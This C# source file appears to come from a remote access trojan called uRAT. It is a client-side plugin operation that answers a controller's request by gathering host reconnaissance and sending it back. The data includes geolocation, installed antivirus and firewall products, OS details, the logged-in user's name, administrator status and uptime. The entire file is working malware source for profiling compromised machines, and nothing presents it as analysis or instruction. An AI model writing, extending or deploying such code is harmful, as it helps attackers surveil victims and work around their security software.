using System;
using System.IO;
using uNet2.Channel;
using uNet2.Packet;
using uNet2.SocketOperation;
using uRAT.CoreClientPlugin.ExtendedSystemInformation.Packets;
using uRAT.CoreClientPlugin.Tools;

namespace uRAT.CoreClientPlugin.ExtendedSystemInformation.Operations
{
    public class ExtendedInformationOperation : SocketOperationBase
    {
        public override int OperationId
        {
            get { return 2; }
        }

        //TODO: make better
        public override void PacketReceived(IDataPacket packet, IChannel sender)
        {
            if (packet is FetchExtendedInformationPacket)
            {
                var returnInfoPacket = new FetchExtendedInformationPacket();
                var geoIpInfo = GeoIpHelper.FetchInformation();
                returnInfoPacket.CountryCode = geoIpInfo.CountryCode;
                returnInfoPacket.CountryName = geoIpInfo.CountryName;
                returnInfoPacket.TimeZone = geoIpInfo.TimeZone;
                returnInfoPacket.Latitude = geoIpInfo.Latitude;
                returnInfoPacket.Longitude = geoIpInfo.Longitude;
                returnInfoPacket.InstalledAntivirus = SystemInformationHelper.FetchInstalledAntivirus();
                returnInfoPacket.InstalledFirewall = SystemInformationHelper.FetchInstalledFirewall();
                returnInfoPacket.ThisPath =
                    Path.GetDirectoryName(typeof (ExtendedInformationOperation).Assembly.Location);

                var friendlyName = SystemInformationHelper.Name;
                var edition = SystemInformationHelper.Edition;
                var ptrSize = SystemInformationHelper.Bits;
                var sp = SystemInformationHelper.ServicePack;
                var operatingSystem = string.Concat(friendlyName, " ", edition, " x", +ptrSize, " ", sp);
                var computerName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                var isAdmin = SystemInformationHelper.IsAdministrator();

                returnInfoPacket.OperatingSystem = operatingSystem;
                returnInfoPacket.IsAdmin = isAdmin;
                returnInfoPacket.ComputerName = computerName;
                returnInfoPacket.InstallDate = new DateTime();
                var upTime = SystemInformationHelper.GetSystemRunningTime();
                returnInfoPacket.RunningTime = string.Format("{0}h {1}m {2}s", upTime.Hours, upTime.Minutes,
                    upTime.Seconds);

                SendPacket(returnInfoPacket);
            }
        }

        public override void PacketSent(IDataPacket packet, IChannel targetChannel)
        {

        }

        public override void SequenceFragmentReceived(SequenceFragmentInfo fragmentInfo)
        {
        
        }

        public override void Disconnected()
        {
      
        }
    }
}
